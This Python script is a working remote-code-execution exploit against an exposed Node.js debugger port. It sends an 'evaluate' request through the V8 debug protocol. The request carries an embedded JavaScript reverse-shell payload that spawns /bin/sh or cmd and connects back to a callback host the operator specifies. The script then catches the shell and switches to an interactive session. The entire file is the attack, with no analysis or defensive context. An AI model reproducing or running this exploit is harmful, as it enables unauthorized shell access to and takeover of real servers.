#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
import telnetlib
import json
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", dest="target", required=True, help="e.g 192.168.0.1")
parser.add_argument("-tp", "--target-port", dest="targetport", required=True, help="e.g. 5858")
parser.add_argument("-chost", required=True, help="e.g 127.0.0.1", dest="chost")
parser.add_argument("-cport", required=True, help="e.g 4422", dest="cport")
parser.add_argument("--no-listen", required=False, action="store_true", dest="nolisten")
args = parser.parse_args()

def msg_gen(chost, cport):
    payload = " (function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? \"cmd\" : \"/bin/sh\"; var net = require(\"net\"), cp = require(\"child_process\"), util = require(\"util\"), sh = cp.spawn(cmd, []); var client = this; client.socket = net.connect("+cport+", \""+chost+"\", function() { client.socket.pipe(sh.stdin); if (typeof util.pump === \"undefined\") { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); })();"
    msg_body = {'seq':'1',
                'type':'request',
                'command':'evaluate',
                'arguments':{'expression':payload,
                           'global':True,
                           'maxStringLength':-1
                            }
               }
    msg_body = json.dumps(msg_body, ensure_ascii=False)
    msg_body_len = len(msg_body)
    msg_header = "Content-Length: {}\r\n\r\n".format(msg_body_len)
    msg_send = msg_header + msg_body
    return msg_send

def msg_send(target, targetport, msg):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print "[*] Connecting to target ..."
    try:
        sock.connect((target, int(targetport)))
        print "[+] Connected successfully."
    except Exception:
        print "[*] Connection failure."
    sock.send(msg)
    return_msg = sock.recv(1024)
    return return_msg

def shell_listen(chost, cport):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((chost, int(cport)))
    sock.listen(5)
    return sock

def shell(sock):
    print "[*] Waiting for connection..."
    client, addr = sock.accept()
    sock.close()
    print "[+] Connection from {}:{}".format(addr[0], addr[1])
    print "[*] Switching to interactive"
    t = telnetlib.Telnet()
    t.sock = client
    t.interact()

msg = msg_gen(args.chost, args.cport)
sock = shell_listen(args.chost, args.cport)
msg_send(args.target, args.targetport, msg)
shell(sock)

